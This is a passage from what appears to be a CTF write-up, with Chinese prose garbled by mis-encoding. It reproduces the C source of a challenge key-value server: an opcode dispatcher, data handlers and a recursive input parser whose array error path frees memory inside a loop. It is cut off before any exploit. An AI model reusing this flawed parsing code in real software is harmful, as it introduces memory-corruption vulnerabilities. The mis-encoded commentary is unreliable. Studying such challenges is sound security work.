h-&gt;opcode[<span class="number">0</span>] &amp;&amp; h-&gt;handler; h++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(op_buf, h-&gt;opcode, op_len_le)) &#123;</span><br><span class="line">                <span class="comment">/* call handler */</span></span><br><span class="line">                <span class="keyword">int</span> res = h-&gt;handler(sock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] op_handler_%s() return %d\n&quot;</span>, getpid(),</span><br><span class="line">                        h-&gt;opcode, res);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                <span class="keyword">goto</span> FETCH_COMMAND;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* unknown opcode return */</span></span><br><span class="line">        resp_str(sock, <span class="string">&quot;Op Not Found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆç»è¿‡ä¸€äº›æ£€æŸ¥ï¼Œç„¶åæ ¹æ®æŠ¥æ–‡é‡Œçš„å†…å®¹è°ƒç”¨å¯¹åº”å‡½æ•°ï¼Œå¯é€‰é¡¹ä¸€å…±æœ‰è¿™äº›</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">op_buf=&#123;</span><br><span class="line">    <span class="number">1</span>:<span class="string">b&quot;ADD&quot;</span>, <span class="number">2</span>:<span class="string">b&quot;DEL&quot;</span>,<span class="number">3</span>:<span class="string">b&quot;MDF&quot;</span>,<span class="number">4</span>:<span class="string">b&quot;RNM&quot;</span>,</span><br><span class="line">    <span class="number">5</span>:<span class="string">b&quot;CPY&quot;</span>,<span class="number">6</span>:<span class="string">b&quot;GET&quot;</span>,<span class="number">7</span>:<span class="string">b&quot;DUM&quot;</span>,<span class="number">8</span>:<span class="string">b&quot;CLR&quot;</span>,</span><br><span class="line">    <span class="number">9</span>:<span class="string">b&quot;SHU&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿™äº›é€‰é¡¹å¯¹åº”çš„å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">op_handler</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> opcode[MAX_OP_SIZE + <span class="number">1</span>];</span><br><span class="line">    uint32 (*handler)(<span class="keyword">int</span>);</span><br><span class="line">&#125; accepted_ops[] = &#123;</span><br><span class="line">    &#123;OPCODE_ADD, op_handler_ADD&#125;,       &#123;OPCODE_DELETE, op_handler_DEL&#125;,</span><br><span class="line">    &#123;OPCODE_MODIFY, op_handler_MDF&#125;,    &#123;OPCODE_RENAME, op_handler_RNM&#125;,</span><br><span class="line">    &#123;OPCODE_COPY, op_handler_CPY&#125;,      &#123;OPCODE_GET, op_handler_GET&#125;,</span><br><span class="line">    &#123;OPCODE_SHUTDOWN, op_handler_SHUT&#125;, &#123;OPCODE_DUMP, op_handler_DUMP&#125;,</span><br><span class="line">    &#123;OPCODE_CLEAR, op_handler_CLR&#125;,     &#123;OPCODE_TREM, <span class="literal">NULL</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æ¯”è¾ƒå…³é”®çš„å°±æ˜¯<code>op_handler_ADD()</code>,<code>op_handler_DEL</code>,<code>op_handler_RNM</code>,<code>op_handler_MDF</code>,<code>op_handler_GET</code>,<code>op_handler_DUMP</code>è¿™å‡ ä¸ªå‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">op_handler_ADD</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* value = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!value) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Value Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">add_data_item</span>(key, value, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Add Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_DEL</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">delete_data_item</span>(key) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Delete Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¿®æ”¹value</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_MDF</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* new_value = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!new_value) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Value Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">modify_data_item</span>(key, new_value) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Modify Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_value);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(new_value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¿®æ”¹key</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_RNM</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Old Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* new_key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!new_key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;New Key Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* check dup */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">get_data_item</span>(new_key) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Duplicate Key&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">rename_data_item</span>(key, new_key) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Rename Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ ¹æ®keyå¾—åˆ°valueçš„æ•°æ®</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_GET</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* res = <span class="built_in">get_data_item</span>(key);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* return an empty type data_t */</span></span><br><span class="line">        <span class="keyword">data_t</span>* empty = (<span class="keyword">data_t</span>*)<span class="built_in">calloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (empty) &#123;</span><br><span class="line">            empty-&gt;type = DATA_TYPE_EMPTY;</span><br><span class="line">            <span class="built_in">do_resp</span>(sock, empty);</span><br><span class="line">            <span class="built_in">release_data_t</span>(empty);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Get Failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">do_resp</span>(sock, res);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¾—åˆ°æ•´ä¸ªæ•°æ®åº“çš„å†…å®¹</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_DUMP</span><span class="params">(<span class="keyword">int</span> sock)</span></span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span> *dump_array = <span class="built_in">dump_data_item</span>();</span><br><span class="line">    <span class="keyword">if</span>(!dump_array)&#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Dump Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">do_resp</span>(sock, dump_array);</span><br><span class="line">    <span class="built_in">release_data_t</span>(dump_array);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­addå‡½æ•°æ˜¯æ¥æ”¶ä¸€ä¸ªkeyå’Œvalueç„¶åæ”¾å…¥databaseä¸­ï¼Œdelå‡½æ•°å°±æ˜¯æ ¹æ®keyåˆ é™¤ä¸€å¯¹é”®å€¼å¯¹ï¼Œgetå°±æ˜¯æ ¹æ®keyå‘ç”¨æˆ·å‘é€å¯¹åº”çš„value,rnmå°±æ˜¯é‡å†™ä¸€ä¸ªkey,mdfå°±æ˜¯æ ¹æ®ä¸€ä¸ªkeyé‡å†™ä¸€ä¸ªvalueï¼Œdumpå°±æ˜¯æŠŠæ•°æ®åº“é‡Œçš„æ‰€æœ‰æ•°æ®å…¨éƒ½å‘é€ç»™ç”¨æˆ·</p>
<p>å¤„ç†ç”¨æˆ·è¾“å…¥çš„å‡½æ•°å¦‚ä¸‹,å°±æ˜¯æ ¹æ®ä¸åŒçš„typeåˆ›å»ºä¸åŒçš„<code>data_t</code>ï¼Œå®¡å®Œå‘ç°éå¸¸å®‰å…¨ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">data_t</span>* <span class="title">read_data_t</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">do_read_data_t</span>(sock, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">data_t</span>* <span class="title">do_read_data_t</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">    uint16 type_be;</span><br><span class="line">    uint16 type_le;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* new data_t obj */</span></span><br><span class="line">    <span class="keyword">data_t</span>* tmp = (<span class="keyword">data_t</span>*)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">data_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (!tmp)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// integer</span></span><br><span class="line">    <span class="keyword">data_integer_t</span> integer_be = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// float</span></span><br><span class="line">    <span class="keyword">data_float_t</span> float_be = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// string</span></span><br><span class="line">    uint32 str_len_be = <span class="number">0</span>;</span><br><span class="line">    uint32 str_len_le = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// array</span></span><br><span class="line">    uint32 count_be = <span class="number">0</span>;</span><br><span class="line">    uint32 count_le = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">data_t</span>* item = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    readn(sock, (<span class="keyword">char</span>*)&amp;type_be, <span class="keyword">sizeof</span>(uint16));</span><br><span class="line">    type_le = BigLittleSwap16(type_be);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (type_le) &#123;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_INTEGER:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_INTEGER;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;integer_be, <span class="keyword">sizeof</span>(<span class="keyword">data_integer_t</span>)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(<span class="keyword">data_integer_t</span>)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp-&gt;integer = BigLittleSwap64(integer_be);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Integer: \x1B[36m0x%llx\x1B[0m\n&quot;</span>, tmp-&gt;integer);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_FLOAT:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_FLOAT;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;float_be, <span class="keyword">sizeof</span>(<span class="keyword">data_float_t</span>)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(<span class="keyword">data_float_t</span>)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            *(uint64*)&amp;tmp-&gt;_float = BigLittleSwap64(*(uint64*)&amp;float_be);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Float: \x1B[35m%lf\x1B[0m\n&quot;</span>, tmp-&gt;_float);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_STRING:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_STRING;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;str_len_be, <span class="keyword">sizeof</span>(uint32)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(uint32)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            str_len_le = BigLittleSwap32(str_len_be);</span><br><span class="line">            tmp-&gt;str.len = str_len_le;</span><br><span class="line">            tmp-&gt;str.ptr = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(str_len_le, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!tmp-&gt;str.ptr)</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            readn(sock, tmp-&gt;str.ptr, str_len_le);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;String(%d): \x1B[32m%s\x1B[0m\n&quot;</span>, tmp-&gt;str.len, tmp-&gt;str.ptr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_ARRAY:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;count_be, <span class="keyword">sizeof</span>(uint32)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(uint32)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            count_le = BigLittleSwap32(count_be);</span><br><span class="line">            tmp-&gt;<span class="built_in">array</span>.count = count_le;</span><br><span class="line">            tmp-&gt;<span class="built_in">array</span>.items = (<span class="keyword">data_t</span>**)<span class="built_in">calloc</span>(count_le, <span class="keyword">sizeof</span>(<span class="keyword">data_t</span>*));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\x1B[107mArray[%d]\x1B[0m:\n&quot;</span>, tmp-&gt;<span class="built_in">array</span>.count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">for</span> (uint32 i = <span class="number">0</span>; i &lt; count_le; i++) &#123;</span><br><span class="line">                item = <span class="keyword">do_read_data_t</span>(sock, level + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (item == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="comment">/* release all received items when error occur */</span></span><br><span class="line">                    <span class="keyword">for</span> (uint32 j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                        <span class="keyword">release_data_t</span>(tmp-&gt;<span class="built_in">array</span>.items[j]);</span><br><span class="line">                        <span class="built_in">free</span>(tmp-&gt;<span class="built_in">array</span>.items);</span><br><span class="line">                        <span class="keyword">goto</span> INVALID;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span 